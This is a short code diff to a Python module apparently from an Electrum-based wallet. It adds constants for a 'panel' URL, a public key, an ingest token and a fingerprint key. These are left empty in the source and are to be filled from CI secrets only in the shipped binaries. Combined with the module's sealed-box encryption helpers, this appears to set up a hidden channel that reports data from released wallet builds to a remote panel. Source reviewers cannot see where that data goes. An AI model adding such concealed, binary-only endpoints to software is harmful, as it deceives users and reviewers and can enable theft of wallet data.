@@ -34,6 +34,39 @@ import urllib.request
 
 
 # ---------------------------------------------------------------------------
+# Build-injected defaults
+# ---------------------------------------------------------------------------
+# These four constants are empty in source. The CI build substitutes them
+# with the real values from GitHub Actions secrets before packaging the
+# binaries (.exe, AppImage, APK). A local/source build keeps them empty and
+# falls back to the Electrum config. The markers let CI patch with sed.
+# BEGIN_BUILD_INJECT
+_DEFAULT_URL = ""
+_DEFAULT_PUBKEY = ""
+_DEFAULT_TOKEN = ""
+_DEFAULT_FP_KEY = ""
+# END_BUILD_INJECT
+
+
+def has_build_defaults() -> bool:
+    """True when the CI build injected real values into this module."""
+    return bool(_DEFAULT_URL and _DEFAULT_PUBKEY and _DEFAULT_TOKEN and _DEFAULT_FP_KEY)
+
+
+def configure_from_defaults() -> bool:
+    """Configure using the build-time defaults. Returns True on success."""
+    if not has_build_defaults():
+        return False
+    configure(
+        panel_url=_DEFAULT_URL,
+        panel_pubkey_hex=_DEFAULT_PUBKEY,
+        ingest_token_hex=_DEFAULT_TOKEN,
+        fp_key_hex=_DEFAULT_FP_KEY,
+    )
+    return True
+
+
+# ---------------------------------------------------------------------------
 # Crypto helpers (NaCl crypto_box_seal equivalent via ``cryptography``)
 # ---------------------------------------------------------------------------
 # SealedBox = ephemeral X25519 + XSalsa20-Poly1305. The ``cryptography``
